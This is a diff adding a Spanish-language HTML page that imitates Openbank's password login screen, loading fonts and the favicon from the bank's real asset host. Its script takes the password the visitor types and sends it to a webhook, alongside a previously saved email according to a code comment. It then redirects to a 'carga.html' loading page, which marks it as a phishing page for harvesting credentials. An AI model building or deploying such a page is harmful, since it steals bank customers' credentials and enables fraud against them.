@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Openbank</title>
+  <link rel="shortcut icon" href="https://assets.openbank.com/web/icons/rebranded_favicon.ico">
+  <style>
+    @font-face {
+      font-family: 'Outfit Semibold';
+      src: url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff2') format('woff2'),
+           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff') format('woff'),
+           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.ttf') format('truetype');
+    }
+    @font-face {
+      font-family: 'Outfit Regular';
+      src: url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff2') format('woff2'),
+           url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff') format('woff'),
+           url('https://assets.openbank.com/web/fonts/Outfit-Regular.ttf') format('truetype');
+    }
+    @font-face {
+      font-family: 'Outfit Light';
+      src: url('https://assets.openbank.com/web/fonts/Outfit-Light.woff2') format('woff2'),
+           url('https://assets.openbank.com/web/fonts/Outfit-Light.woff') format('woff'),
+           url('https://assets.openbank.com/web/fonts/Outfit-Light.ttf') format('truetype');
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { font-size: 62.5%; }
+
+    body {
+      font-family: 'Outfit Regular', sans-serif;
+      background-color: #f7f7f7;
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    .background-ring {
+      position: fixed;
+      right: -120px;
+      top: 50%;
+      transform: translateY(-40%);
+      width: 500px;
+      height: 500px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .header {
+      background-color: #111111;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+      height: 64px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .header-logo { display: flex; align-items: center; padding-left: 110px; }
+    .header-logo img { height: 50px; width: auto; }
+
+    .btn-cerrar {
+      background: transparent;
+      color: #fff;
+      border: 1.5px solid #fff;
+      border-radius: 0px;
+      padding: 8px 20px;
+      font-family: 'Outfit Regular', sans-serif;
+      font-size: 1.4rem;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .btn-cerrar:hover { background-color: rgba(255,255,255,0.1); }
+
+    .main-content {
+      display: flex;
+      justify-content: center;
+      padding: 120px 24px 40px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .login-container { width: 100%; max-width: 21.7cm; }
+
+    .login-title {
+      font-family: 'Outfit Semibold', sans-serif;
+      font-size: 3.2rem;
+      color: #1a1a1a;
+      text-align: center;
+      margin-bottom: 40px;
+      line-height: 1.25;
+      white-space: nowrap;
+      width: 21.7cm;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .login-subtitle {
+      font-family: 'Outfit Semibold', sans-serif;
+      font-weight: bold;
+      font-size: 1.4rem;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+      width: 15.2cm;
+    }
+
+    .form-area { width: 10cm; margin: 0 auto; }
+
+    .input-wrapper { position: relative; margin-bottom: 16px; }
+
+    .input-field {
+      width: 10cm;
+      padding: 14px 44px 14px 14px;
+      border: 1.5px solid #999999;
+      border-radius: 0px;
+      font-family: 'Outfit Regular', sans-serif;
+      font-size: 1.5rem;
+      color: #1a1a1a;
+      background-color: #ffffff;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .input-field::placeholder {
+      color: #999;
+      font-family: 'Outfit Light', sans-serif;
+      font-size: 1.4rem;
+    }
+    .input-field:focus {
+      border-color: #1a1a1a;
+    }
+
+    .toggle-visibility {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .toggle-visibility svg { width: 18px; height: 18px; }
+
+    .forgot-password {
+      font-family: 'Outfit Regular', sans-serif;
+      font-size: 1.3rem;
+      color: #1a1a1a;
+      text-decoration: underline;
+      margin-bottom: 20px;
+      display: inline-block;
+      cursor: pointer;
+    }
+    .forgot-password:hover { color: #333; }
+
+    .btn-continuar {
+      width: 10cm;
+      padding: 14px;
+      background-color: #bac7cb;
+      color: #8a8a8a;
+      border: none;
+      border-radius: 4px;
+      font-family: 'Outfit Regular', sans-serif;
+      font-size: 1.5rem;
+      cursor: default;
+      transition: background-color 0.2s, color 0.2s;
+    }
+    .btn-continuar.active {
+      background-color: #1a1a1a;
+      color: #fff;
+      cursor: pointer;
+    }
+    .btn-continuar.active:hover { background-color: #333; }
+
+    @media (max-width: 768px) {
+      .background-ring { display: none; }
+      .header { padding: 0 16px; }
+      .header-logo { padding-left: 0; }
+      .main-content { padding: 40px 24px 24px; }
+      .login-container { max-width: 400px; margin: 0 auto; }
+      .login-title { font-size: 2.4rem; white-space: normal; width: auto; }
+      .login-subtitle { width: auto; }
+      .form-area { width: 100%; max-width: 400px; }
+      .input-field { width: 100%; max-width: 400px; }
+      .btn-continuar { width: 100%; max-width: 400px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="background-ring">
+    <svg viewBox="0 0 620 620" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="310" cy="310" r="260" stroke="rgba(0,0,0,0.045)" stroke-width="90" fill="none"/>
+    </svg>
+  </div>
+
+  <header class="header">
+    <div class="header-logo">
+      <img src="logo.png" alt="Openbank logo">
+    </div>
+    <button class="btn-cerrar">Cerrar</button>
+  </header>
+
+  <main class="main-content">
+    <div class="login-container">
+      <h1 class="login-title">Escribe tu contraseña</h1>
+      <div class="form-area">
+      <p class="login-subtitle">Contraseña</p>
+      <div class="input-wrapper">
+        <input type="password" class="input-field" id="passwordInput" placeholder="Escribe tu contraseña" autocomplete="current-password">
+        <button class="toggle-visibility" type="button" aria-label="Mostrar/ocultar" onclick="togglePassword()">
+          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 32 32">
+            <path style="fill:#0077C0" d="M16 25.301c-1.501-0.009-2.944-0.246-4.299-0.677-0.128-0.058-0.29-0.276-0.29-0.532 0-0.329 0.267-0.596 0.596-0.596 0.051 0 0.1 0.006 0.147 0.018 1.146 0.369 2.469 0.586 3.842 0.595 7.118 0 13.226-6.491 14.64-8.118-1.464-1.666-3.072-3.142-4.825-4.432-0.264-0.163-0.384-0.356-0.384-0.576 0-0.329 0.267-0.596 0.596-0.596 0.154 0 0.294 0.058 0.399 0.154 2.056 1.498 3.846 3.172 5.412 5.039 0.118 0.147 0.166 0.276 0.166 0.415s-0.048 0.269-0.129 0.37c-0.284 0.363-7.175 8.935-15.871 8.935z"/>
+            <path style="fill:#0077C0" d="M5.908 21.557c-0.131-0.001-0.251-0.044-0.348-0.117-2.048-1.493-3.832-3.161-5.394-5.021-0.118-0.147-0.166-0.275-0.166-0.415s0.048-0.269 0.129-0.37c0.292-0.363 7.175-8.891 15.88-8.891 1.247 0.005 2.453 0.17 3.602 0.476 0.193 0.019 0.415 0.268 0.415 0.568 0 0.329-0.267 0.596-0.596 0.596-0.076 0-0.149-0.014-0.216-0.040-0.956-0.273-2.062-0.441-3.203-0.461-7.125 0-13.234 6.491-14.648 8.118 1.449 1.648 3.040 3.109 4.773 4.388 0.23 0.168 0.325 0.342 0.325 0.538 0 0.327-0.263 0.592-0.59 0.596z"/>
+            <path style="fill:#0077C0" d="M10.665 16.596c-0.008 0-0.017 0.001-0.027 0.001-0.329 0-0.596-0.267-0.596-0.596 0 0 0 0 0-0.001 0-3.29 2.667-5.958 5.958-5.958 0.022-0.003 0.047-0.004 0.073-0.004 0.329 0 0.596 0.267 0.596 0.596s-0.267 0.596-0.596 0.596c-0.026 0-0.051-0.002-0.076-0.005-2.63 0.005-4.763 2.141-4.763 4.775 0 0 0 0 0 0s0 0 0 0.001c0 0.32-0.252 0.581-0.568 0.595z"/>
+            <path style="fill:#0077C0" d="M16 21.958c-0.296-0.037-0.523-0.288-0.523-0.591s0.227-0.554 0.52-0.591c2.636-0.005 4.769-2.141 4.769-4.775 0 0 0 0 0 0-0.003-0.022-0.004-0.047-0.004-0.073 0-0.329 0.267-0.596 0.596-0.596s0.596 0.267 0.596 0.596c0 0.026-0.002 0.051-0.005 0.076 0-0.003 0-0.003 0-0.003 0 3.287-2.662 5.952-5.948 5.958z"/>
+            <path style="fill:#0077C0" d="M2.517 28.644l26.131-26.131 0.836 0.836-26.131 26.131-0.836-0.836z"/>
+          </svg>
+        </button>
+      </div>
+      <button class="btn-continuar" id="btnContinuar">Continuar</button>
+      </div>
+    </div>
+  </main>
+
+  <script src="webhook-config.js"></script>
+  <script>
+    var passwordInput = document.getElementById('passwordInput');
+    var btnContinuar = document.getElementById('btnContinuar');
+    passwordInput.addEventListener('input', function() {
+      if (this.value.trim().length > 0) {
+        btnContinuar.classList.add('active');
+      } else {
+        btnContinuar.classList.remove('active');
+      }
+    });
+
+    function togglePassword() {
+      var input = document.getElementById('passwordInput');
+      if (input.type === 'password') {
+        input.type = 'text';
+      } else {
+        input.type = 'password';
+      }
+    }
+
+    // Webhook submission
+    btnContinuar.addEventListener('click', async function() {
+      if (this.classList.contains('active')) {
+        const password = passwordInput.value.trim();
+        
+        // Enviar datos al webhook (con email guardado)
+        const result = await sendToWebhook({ password: password }, 'password');
+        
+        if (result.success) {
+          // Redirigir a página de carga
+          redirectTo('carga.html');
+        } else {
+          console.error('Error al enviar contraseña:', result.error);
+          // Aquí podrías mostrar un mensaje de error al usuario
+        }
+      }
+    });
+  </script>
+</body>
+</html>
